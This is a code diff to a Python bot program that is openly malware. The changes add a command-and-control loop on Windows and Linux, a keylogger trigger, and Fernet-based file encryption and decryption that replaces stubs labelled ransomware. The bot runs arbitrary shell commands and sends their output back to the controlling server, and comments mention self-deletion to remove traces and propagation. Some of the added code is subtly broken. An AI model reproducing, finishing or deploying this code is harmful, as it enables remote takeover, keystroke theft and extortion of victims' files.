@@ -10,12 +10,12 @@ MODULE NAME: ______
 try:
 	import socket # Import socket for creating TCP connection.
 	from subprocess import PIPE, run # Import subprocess to execute system commands.
-	from os import devnull, remove, mkdir, path # Import devnull, mkdir, and remove from os module.
+	import os # Import os for devnull, remove, mkdir
 	from sys import exit # Import exit from sys to quit program when specified.
 	from platform import system # Import system from platform to detect os.
 	from pynput import keyboard # Import keyboard to perform keylogger operations.
 	from threading import Timer # Import Timer to create thread that'll run every 20s.
-	from Crypto.Cipher import AES # Use AES encryption to encrypt stuff.
+	from cryptography.fernet import Fernet # Import Fernet for encryption.
 except ImportError as e:
     print(f"Import error: {e}")
     
@@ -59,7 +59,7 @@ def self_delete(name: str):
 		Returns:
 			None
 	"""
-	remove(name) # Delete the local file to remove traces of our presence 
+	os.remove(name) # Delete the local file to remove traces of our program.
 	
 def propagate(name: str):
 	"""This function will create other instances of this file in 
@@ -114,38 +114,56 @@ def keylogger():
 	with keyboard.Listener(
 		onpress=on_press) as capturer:
 		try:
-			mkdir(DIRECTORY) # Attempt to create hidden directory in temp folder.
+			os.mkdir(DIRECTORY) # Attempt to create hidden directory in temp folder.
 			capturer.join()
 		except OSError:
 			pass
 
+	return "Keylogger initiated..."
+
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
-# Ransomware stuff-=-=-=-=-=-=-=-=-=-=-=-=-=
-def encrypt_it(data: str):
-	"""This function will encyrpt the data passed as an argument.
-		Arguments:
-			data (str): The contents of a file.
+def crypto(action, *request):
+	"""This function will handle all of our encryption/decryption processes.
+		Argument:
+			None
 		Returns:
-			Will return the encrypted form of the files contents.
+			None
 	"""
-	# THIS IS FOR YOU CHRIS !!!!!!!!!!!!!!!!!!
+	key_copy = ''
+	def encrypt_it():
+		to_encrypt = request
+		with open(to_encrypt, 'rb') as inf:
+			data = inf.read()
+			with open(to_encrypt, 'wb') as ouf:
+				key = Fernet.generate_key()
+				key_copy = key
+				cipher = Fernet(key)
+				with open('key.key', 'wb') as keyfile:
+					keyfile.write(key)
+				cipher_text = cipher.encrypt(data)
+				ouf.write(cipher_text)
 
-def decrypt_it(data: str):
-	"""This function will decyrpt the data passed as an argument.
-		Arguments:
-			data (str): The contents of a file.
-		Returns:
-			Will return the decrypted form of the files contents.
-	"""
-	# THIS IS FOR YOU CHRIS !!!!!!!!!!!!!!!!!!
+		return 'File encrypted... Key = ' + key_copy
+	
+	def decrypt_it():
+		to_encrypt, key = request
+		with open(to_encrypt, 'rb') as inf:
+			data = inf.read()
+			with open(to_encrypt, 'wb') as ouf:
+				key = open('key.key', 'rb').read()
+				cipher = Fernet(key)
+				os.remove('key.key')
+				plain_text = cipher.decrypt(data)
+				ouf.write(plain_text)
 
-def ransomware(*request: str):
-	"""This function will encrypt a folder, a file, or the entire volume on a computer.
-		Arguments:
-		Returns
-	"""
-	# THIS IS FOR YOU CHRIS !!!!!!!!!!!!!!!!!!
+		return "File Decrypted..."
+
+	if action == 'encrypt':
+		return encrypt_it()
+	else:
+		return decrypt_it()
+
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -163,11 +181,18 @@ class WindowsBot:
 			Returns:
 				Will return the output of the command that was executed.
 		"""
-		DEVNULL = open(devnull, 'w') # Open devnull file to send stderr to.
-		output = run(command.split(), # Run command.
-					stdout=PIPE, # Pipe command to store in variable.
-					stderr=DEVNULL)	# Send standard error to devnull.
-		return output
+		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
+		try:
+			output = run(command.split(), # Run command.
+						stdout=PIPE, # Pipe command to store in variable.
+						stderr=DEVNULL)	# Send standard error to devnull.
+			return output.stdout
+		except:
+			try:
+				os.chdir(command[3:])
+				return "Ok"
+			except:
+				return "Invalid command..."
 
 	def handle_request(self):
 		"""This function will handle all tasks related to request made by the server.
@@ -180,9 +205,17 @@ class WindowsBot:
 		with sock:
 			while True:
 				command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
-				if command != '':
-					command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
-					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
+				command_output = None
+				if command == 'keylog':
+					command_output = keylogger()
+				elif command[:7] == 'encrypt':
+					command_output = crypto(command[:7], command[8:])
+				elif command[:7] == 'decrypt':
+					command_output = crypto(command[7:], command[8:].split())
+				else:
+					command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
+				sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
+
 		
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -200,12 +233,18 @@ class LinuxBot:
 			Returns:
 				Will return the output of the command that was executed.
 		"""
-		DEVNULL = open(devnull, 'w') # Open devnull file to send stderr to.
-		output = run(command.split(), # Run command.
-					stdout=PIPE, # Pipe command to store in variable.
-					stderr=DEVNULL)	# Send standard error to devnull.
-
-		return output.stdout
+		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
+		try:
+			output = run(command.split(), # Run command.
+						stdout=PIPE, # Pipe command to store in variable.
+						stderr=DEVNULL)	# Send standard error to devnull.
+			return output.stdout
+		except:
+			try:
+				os.chdir(command[3:])
+				return "Ok"
+			except:
+				return "Invalid command..."
 
 	def handle_request(self):
 		"""This function will handle all tasks related to request made by the server.
@@ -218,9 +257,16 @@ class LinuxBot:
 		with sock:
 			while True:
 				command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
-				if command != '':
+				command_output = None
+				if command == 'keylog':
+					command_output = keylogger()
+				elif command[:7] == 'encrypt':
+					command_output = crypto(command[:7], command[8:])
+				elif command[:7] == 'decrypt':
+					command_output = crypto(command[7:], command[8:].split())
+				else:
 					command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
-					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
+				sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
